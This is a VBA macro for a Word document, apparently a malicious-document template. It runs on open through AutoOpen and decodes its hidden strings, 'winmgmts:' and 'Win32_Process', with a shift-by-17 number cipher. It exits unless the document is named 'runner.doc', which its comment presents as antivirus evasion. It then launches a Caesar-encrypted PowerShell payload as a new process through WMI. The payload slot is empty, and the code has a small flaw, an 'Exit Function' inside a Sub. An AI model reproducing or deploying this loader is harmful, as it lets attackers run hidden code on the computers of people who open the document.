Sub MyMacro()
    Dim Apples As String
    Dim Water As String

    ' the encrpted is the doc name. If doc name change in heuristic AT then exit
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    ' Use powershell_caesar.ps1 to encypt
    Apples = ""
    Water = Nuts(Apples)
    
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
